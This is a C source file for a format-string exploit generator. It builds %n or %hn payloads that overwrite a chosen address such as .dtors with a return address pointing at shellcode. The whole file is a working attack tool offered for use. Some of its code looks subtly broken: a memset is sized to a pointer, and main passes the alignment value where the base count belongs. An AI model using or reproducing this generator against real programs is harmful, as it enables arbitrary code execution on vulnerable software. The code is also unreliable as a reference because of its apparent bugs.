#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#define ADD 0x100

#define OCT(b0, b1, b2, b3, addr)   { \
            b0 = (addr >> 24) & 0xff; \
            b1 = (addr >> 16) & 0xff; \
            b2 = (addr >>  8) & 0xff; \
            b3 = (addr      ) & 0xff; \
        }


void usage (char *program) {

  fprintf(stderr, "\n" );
  fprintf(stderr, "Usage : %s [-nh] -l <retloc> -r <retaddr> -o <offset> -b <base>\n", program);
  fprintf(stderr, "  -n :\tFormat string with %%n\n");
  fprintf(stderr, "  -h :\tFormat string with %%hn\n");
  fprintf(stderr, "  -l <locaddr> : address to overwrite (like .dtors)\n");
  fprintf(stderr, "  -r <retaddr> : where we want to return (shellcode)\n" );
  fprintf(stderr, "  -o <offset>  : distance in 'words' to reach the part of the buffer we control\n" );
  fprintf(stderr, "  -b <base>    : amount of char previously in the string\n\n" );
}

char *nway(unsigned int retaddr, unsigned int offset,
           unsigned int base) {

  char *buff;

  unsigned char b0, b1, b2, b3;
  unsigned int  length = 128;

  int start = ((base / ADD) + 1) * ADD;

  OCT(b0, b1, b2, b3, retaddr);

  if(!(buff = (char *)malloc(256))) {
    printf("Can't allocate buffer.\n");
    exit(-1);
  }

  memset(buff, 0x00, sizeof(buff));

  snprintf(buff, length,
                 "%%%dx%%%d$n%%%dx%%%d$n"
                 "%%%dx%%%d$n%%%dx%%%d$n",
                b3 - sizeof(size_t) * 4 + start - base, offset,
                b2 - b3 + start, offset + 1,
                b1 - b2 + start, offset + 2,
                b0 - b1 + start, offset + 3
          );

  return buff;
}

char *hnway(unsigned int retaddr, unsigned int offset,
            unsigned int base) {

  char *buff = (char *)malloc(256);

  unsigned int low, high;
  unsigned int wr1, wr2;

  low  = (retaddr & 0x0000ffff);
  high = (retaddr & 0xffff0000) >> 16;

  if (high < low) high += 0x10000;

  wr1 = low  - 8 - base;
  wr2 = high - low;

  sprintf(buff, "%%.%du%%%d$hn%%.%du%%%d$hn",
                wr1, offset, wr2, offset+1);
  return buff;
}


int main(int argc, char * argv[]) {

  char          opt;
  char          *fmt;
  char          *endian;
  unsigned long locaddr;
  unsigned long retaddr;
  unsigned int  offset, base, align = 0;
  unsigned char b0, b1, b2, b3;

  int length, way;

  if(argc != 10) {
    usage(argv[0]);
    return -1;
  }

  length = (sizeof(size_t) * 16) + 1;

  if(!(endian = (char *)malloc(length * sizeof(char)))) {
    printf("Can't allocate buffer.\n");
    return -1;
  }

  memset(endian, 0x00, length);

  while((opt = getopt(argc, argv, "nhl:r:o:b:")) != EOF)
    switch(opt) {
      case 'n': way      = 0; break;
      case 'h': way      = 1; break;
      case 'l': locaddr = strtoul(optarg, NULL, 16); break;
      case 'r': retaddr = strtoul(optarg, NULL, 16); break;
      case 'o': offset  = atoi(optarg); break;
      case 'b': base    = atoi(optarg); break;
      default : usage(argv[0]); exit(-1);
    }

  OCT(b0, b1, b2, b3, (locaddr+4));

  if(base % 4) {
    align = 4 - (base % 4);
    base += align;
  }

  if(way == 0) {

    snprintf(endian, length,
             "%c%c%c%c"
             "%c%c%c%c"
             "%c%c%c%c"
             "%c%c%c%c",
             b3 + 0, b2, b1, b0,
             b3 + 1, b2, b1, b0,
             b3 + 2, b2, b1, b0,
             b3 + 3, b2, b1, b0);

    fmt = nway(retaddr, offset, align);
  }
  else {
    snprintf(endian, length,
             "%c%c%c%c"
             "%c%c%c%c",
             b3 + 0, b2, b1, b0,
             b3 + 2, b2, b1, b0);

    fmt = hnway(retaddr, offset, align);
  }

  for(; align > 0; --align)
    printf(".");

  printf("%s%s\n", endian, fmt);

  return 0;
}
